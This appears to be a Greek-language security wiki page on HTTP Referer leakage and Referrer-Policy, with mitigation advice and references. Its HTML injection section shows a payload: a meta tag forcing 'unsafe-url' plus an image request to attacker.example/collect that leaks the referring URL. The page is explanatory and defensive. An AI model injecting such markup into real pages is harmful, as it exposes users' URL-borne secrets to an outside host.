# Ενδιαφέρουσα συμπεριφορά HTTP

{{#include ../banners/hacktricks-training.md}}

## Header `Referer` και Referrer Policy

Το HTTP request header `Referer` προσδιορίζει το απόλυτο ή μερικό URL από το οποίο ζητήθηκε ένας resource. Ανάλογα με την ενεργή referrer policy, μπορεί να περιλαμβάνει το referring origin, το path και το query string, αλλά όχι το URL fragment.<sup>[[1]](#references)</sup>

### Διαρροή ευαίσθητων πληροφοριών

Secrets σε URL paths ή query parameters μπορούν να διαρρεύσουν μέσω του browser history, των logs, των analytics, των copied links και του header `Referer`. Επομένως, ένα cross-origin link ή subresource request μπορεί να αποκαλύψει το referring URL σε έναν external server.<sup>[[2]](#references)</sup>

### Mitigation

Χρησιμοποιήστε το response header `Referrer-Policy` για να ελέγξετε πόσες referrer πληροφορίες στέλνει ο browser. Το `strict-origin-when-cross-origin` είναι το σύγχρονο default στους browsers, ενώ το `no-referrer` καταστέλλει πλήρως το header· επιλέξτε την policy που ταιριάζει στις απαιτήσεις της εφαρμογής.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Μην τοποθετείτε passwords, session identifiers, API keys ή άλλες ευαίσθητες τιμές σε URLs. Στέλνετέ τα σε κατάλληλα request headers ή request bodies μέσω TLS.<sup>[[2]](#references)</sup>

### Σκέψεις για το HTML Injection

Ένα document μπορεί επίσης να ορίσει μια policy σε επίπεδο σελίδας με `<meta name="referrer">`. Αν ένα flaw HTML Injection επιτρέπει σε έναν attacker να εισαγάγει ένα effective meta element, ο attacker μπορεί να επιχειρήσει να αποδυναμώσει την policy του document για subsequent requests. Οι dynamically injected ή conflicting meta policies μπορεί να συμπεριφέρονται απρόβλεπτα, επομένως επαληθεύστε τη συμπεριφορά στο target browser αντί να υποθέτετε ότι το response header παρακάμπτεται πάντα.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Διόρθωσε το underlying HTML injection και κράτησε τα sensitive data εκτός του URL· η referrer policy αποτελεί defense in depth και όχι υποκατάστατο κανενός από τα δύο controls.

## References

- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Χρήση της GET Request Method με Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
